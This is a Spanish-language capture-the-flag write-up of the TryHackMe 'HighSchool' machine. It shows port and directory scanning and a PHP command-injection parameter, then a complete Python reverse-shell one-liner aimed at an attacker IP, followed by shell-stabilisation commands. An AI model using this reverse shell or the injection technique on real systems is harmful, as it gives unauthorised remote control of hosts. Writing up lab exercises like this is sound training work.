---
title: HighSchool
description: Write Up de la máquina High School de la plataforma TryHackMe
published: true
date: 2025-05-08T16:42:48.544Z
tags: 
editor: markdown
dateCreated: 2025-05-06T15:54:10.908Z
---

# U. A. HighSchool
Bienvenido al write up de la maquina HighSchool de TryHackMe.

## Reconocimiento
Lo primero que vamos a hacer es un analisis de los puertos disponibles donde encontramos tanto el puerto 22, como el puerto 80.

```
nmap -sT -Pn -sV 10.10.229.240
```

IMAGEN 1

Así que vamos a entrar en el website, para saber que hay.

Podemos empezar a hacer uso del dirb para comprobar las entradas a los que tenemos acceso.
```
dirb http://{IP}
```

IMAGEN 2

Dentro del analisis hemos encontrado la carpeta assest, aquí vamos a entrar a comprobar que mas cosas interesantes podemos encontrar.


IMAGEN 3

Nos lleva a un website aparantemente vacío, pero sin embargo parece que interpreta codigo php debido a que finaliza en .php, vamos a poner algún comando con ?cmd=

Como por ejemplo ?cmd=id

IMAGEN 4

Parece que nos ha dado una respuesta pero está cifrada, en lo que parece ser Base 64

IMAGEN 5




## Explotación

Vamos a escribir lo siguiente

*export RHOST="10.9.3.144";export RPORT=9000;python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("sh")'*


Tras esto podemos observar como tenemos una shell, así que vamos a securizarla con:

```
python3 -c "import pty;pty.spawn('/bin/bash')"
```

Tras esto hacemos <kbd>Ctrl</kbd> + <kbd>Z </kbd>. y ponemos stty raw -echo;fg

Le damos a enter dos veces y ponemos export TERM=xterm.
Con esto podemos saber que funciona, por lo que vamos a intentar establecer una shell reversa para conectarnos a nosotros mismos. 